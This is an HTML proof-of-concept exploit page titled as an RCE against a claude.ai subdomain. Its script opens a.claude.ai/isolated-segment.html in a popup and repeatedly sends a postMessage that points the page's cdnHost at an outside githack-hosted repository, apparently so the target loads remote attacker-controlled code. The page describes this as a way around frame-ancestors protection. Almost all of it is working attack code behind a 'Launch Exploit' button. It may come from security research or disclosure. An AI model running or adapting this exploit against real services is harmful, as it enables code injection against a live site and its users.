<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <title>Anthropic RCE PoC - Popup Method</title>
    <style>
        body { font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif; padding: 40px; text-align: center; background: #f4f4f9; }
        .card { background: white; padding: 30px; border-radius: 12px; box-shadow: 0 4px 15px rgba(0,0,0,0.1); display: inline-block; }
        button { background: #d9534f; color: white; border: none; padding: 15px 30px; font-size: 18px; border-radius: 8px; cursor: pointer; transition: 0.3s; }
        button:hover { background: #c9302c; }
        #log { margin-top: 20px; color: #555; font-family: monospace; }
    </style>
</head>
<body>

    <div class="card">
        <h1>Vulnerability PoC</h1>
        <p>Target: <code>a.claude.ai/isolated-segment.html</code></p>
        <p>This method bypasses <b>frame-ancestors</b> by using <code>window.open</code>.</p>
        
        <button onclick="launchExploit()">Launch Exploit</button>
        
        <div id="log">Status: Ready</div>
    </div>

    <script>
        const log = document.getElementById('log');
        const GITHACK_HOST = "raw.githack.com/CloudWaddie/anthropic-poc/main";

        function launchExploit() {
            log.innerText = "Status: Opening target tab...";
            
            // 1. Open the target in a new window/tab
            const targetWin = window.open("https://a.claude.ai/isolated-segment.html", "_blank");

            if (!targetWin) {
                log.innerText = "Error: Popup blocked! Please allow popups for this site.";
                return;
            }

            // 2. Start a "heartbeat" to send the message. 
            // Since we can't hear the 'ready' event cross-origin in a popup easily, 
            // we blast the message multiple times.
            let attempts = 0;
            const interval = setInterval(() => {
                attempts++;
                log.innerText = `Status: Sending payload (Attempt ${attempts}/10)...`;
                
                targetWin.postMessage({
                    target: "isolated-segment",
                    type: "init",
                    writeKey: "poc-key",
                    cdnHost: GITHACK_HOST
                }, "*");

                if (attempts >= 10) {
                    clearInterval(interval);
                    log.innerText = "Status: Exploit sequence complete. Check the new tab.";
                }
            }, 2000); // Send every 2 seconds to ensure the script has loaded
        }
    </script>
</body>
</html>
